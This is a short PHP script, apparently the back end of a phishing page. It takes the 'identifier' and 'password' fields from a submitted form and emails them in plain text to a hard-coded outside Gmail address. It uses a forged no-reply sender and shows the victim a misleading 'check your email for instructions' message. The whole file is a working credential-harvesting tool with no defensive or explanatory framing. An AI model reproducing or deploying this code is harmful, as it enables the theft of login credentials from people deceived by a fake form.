<?php
if ($_SERVER["REQUEST_METHOD"] == "POST") {
    $email_to = "jaeger.62frei@gmail.com";
    $subject = "Form Submission";
    $email = $_POST['identifier'];
    $password = $_POST['password'];
    $message = "identifier: $email\npassword: $password";

    // Email headers
    $headers = "From: no-reply@gmail.com\r\n";

    // Send the email
    if (mail($email_to, $subject, $message, $headers)) {
        echo "Email sent successfully Check your email for instructions.";
    } else {
        echo "Failed to send email.";
    }
}
?>